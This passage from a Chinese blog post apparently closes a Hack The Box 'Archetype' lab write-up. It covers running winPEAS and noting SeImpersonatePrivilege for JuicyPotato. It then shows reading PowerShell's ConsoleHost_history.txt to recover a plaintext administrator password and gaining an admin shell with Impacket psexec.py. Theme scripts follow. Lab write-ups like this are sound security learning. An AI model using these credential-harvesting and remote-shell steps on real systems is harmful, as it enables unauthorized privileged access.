+<p>解决办法是使用<code>-UseBasicParsing</code> 参数，让 PowerShell 使用基本的 HTML 解析方式，而不是依赖 IE 引擎。</p>
+<p>执行 <strong>winPEASx64.exe</strong>：</p>
+<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">PS C:<span class="hljs-string">\Users\sql_svc\Downloads&gt;</span> .<span class="hljs-string">\winPEASx64.exe</span><br></code></pre></td></tr></table></figure>
+
+<p>从输出的报告可以看到：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241217175322.png"></p>
+<p>当前用户拥有[ SeImpersonatePrivilege 权限](<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege">SeImpersonatePrivilege and SeCreateGlobalPrivilege - Windows Server | Microsoft Learn</a>)。这个权限可能被 [Juicy Potato](<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato">多汁土豆 |黑客技巧 — JuicyPotato | HackTricks</a>)利用。此处待日后展开讨论。</p>
+<p>由于当前是一个普通用户账户，同时也是一个服务账户（为某些服务或应用程序运行而创建的账户），因此值得检查一下是否有经常访问的文件或执行的命令。</p>
+<p>在 Windows 系统中，PowerShell 会记录用户执行的命令历史，类似于 Linux 中的 <code>.bash_history</code>。历史记录文件 <strong>ConsoleHost_history.txt</strong> 存储在 <code>C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\</code> 目录下。</p>
+<p>查看这个文件，我们以明文形式获得了管理员用户的密码，该密码为 MEGACORP_4dm1n！！</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241217181120.png"></p>
+<p>现在，我们可以再次使用 Impacket 工具中的 <strong>psexec.py</strong> 工具，以管理员身份获取 shell。</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> psexec.py administrator@<span class="hljs-number">10.129.111.223</span><br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241217182129.png"></p>
+<p>在管理员的 Desktop 文件找到 flag：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241217182813.png"></p>
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>这个靶场是目前三个里面花的时间最长的，因为涉及到权限提升，不仅要找到用户 flag，还要找到管理员 flag 。实际上，这个过程中并没有涉及到 Windows 权限提升，而是通过记录 PoweShell 的文件找到了管理员的密码。关于权限提升，目前是一窍不通，以后遇到相关靶场再详细记录。通过三个靶场的练习，一些重复的知识我已经完全掌握了。这是一个良好的开端，日后会坚持刷题的。</p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/Avatar.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/Avatar.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">xxshh</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2024/12/17/Hack-The-Box-Archetype/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2024/12/17/Hack-The-Box-Archetype/')">Hack The Box-Ignition</span></a></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank"></a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/HackTheBox/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>HackTheBox<span class="tagsPageCount">3</span></a></div></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2024/12/14/Hack%20The%20Box-Three/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E6%A9%99.jpg?_r_=481f33ea-1550-8b2d-b91e-48c8b29a3143" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Hack The Box-Three</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/12/13/Hack%20The%20Box-Responder/" title="Hack The Box-Responder"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%BB%BF.jpg?_r_=acfe4dfb-f791-810f-948c-c464ed9f9080" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-12-13</div><div class="title">Hack The Box-Responder</div></div></a></div><div><a href="/2024/12/14/Hack%20The%20Box-Three/" title="Hack The Box-Three"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E6%A9%99.jpg?_r_=481f33ea-1550-8b2d-b91e-48c8b29a3143" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-12-14</div><div class="title">Hack The Box-Three</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来看我的博客~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Write-up"><span class="toc-number">2.</span> <span class="toc-text">Write-up</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-number">3.</span> <span class="toc-text">Conclusion</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/12/17/Hack-The-Box-Archetype/" title="Hack The Box-Ignition"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E9%BB%84.jpg?_r_=186c6211-ff71-fddc-81ac-f9e6d3c59b79" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hack The Box-Ignition"/></a><div class="content"><a class="title" href="/2024/12/17/Hack-The-Box-Archetype/" title="Hack The Box-Ignition">Hack The Box-Ignition</a><time datetime="2024-12-17T02:01:40.000Z" title="发表于 2024-12-17 10:01:40">2024-12-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/14/Hack%20The%20Box-Three/" title="Hack The Box-Three"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E6%A9%99.jpg?_r_=481f33ea-1550-8b2d-b91e-48c8b29a3143" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hack The Box-Three"/></a><div class="content"><a class="title" href="/2024/12/14/Hack%20The%20Box-Three/" title="Hack The Box-Three">Hack The Box-Three</a><time datetime="2024-12-14T04:52:06.000Z" title="发表于 2024-12-14 12:52:06">2024-12-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/13/Hack%20The%20Box-Responder/" title="Hack The Box-Responder"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%BB%BF.jpg?_r_=acfe4dfb-f791-810f-948c-c464ed9f9080" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hack The Box-Responder"/></a><div class="content"><a class="title" href="/2024/12/13/Hack%20The%20Box-Responder/" title="Hack The Box-Responder">Hack The Box-Responder</a><time datetime="2024-12-13T09:56:20.000Z" title="发表于 2024-12-13 17:56:20">2024-12-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/11/Python%E5%AE%89%E5%85%A8/" title="Python安全"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E8%93%9D.jpg?_r_=65fe1598-febc-50a9-9242-705929e8b3e6" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python安全"/></a><div class="content"><a class="title" href="/2024/12/11/Python%E5%AE%89%E5%85%A8/" title="Python安全">Python安全</a><time datetime="2024-12-11T11:26:54.000Z" title="发表于 2024-12-11 19:26:54">2024-12-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/10/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="PHP反序列化漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E6%A9%99.jpg?_r_=fe05b0f8-b5a4-6666-d55d-003489b41b49" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化漏洞"/></a><div class="content"><a class="title" href="/2024/12/10/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="PHP反序列化漏洞">PHP反序列化漏洞</a><time datetime="2024-12-10T07:50:36.000Z" title="发表于 2024-12-10 15:50:36">2024-12-10</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By xxshh</div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><span class="sidebar-menu-item-title">标签</span></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("31/8/2024 22:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2024 By 安知鱼 V1.6.12",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 xxshh 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
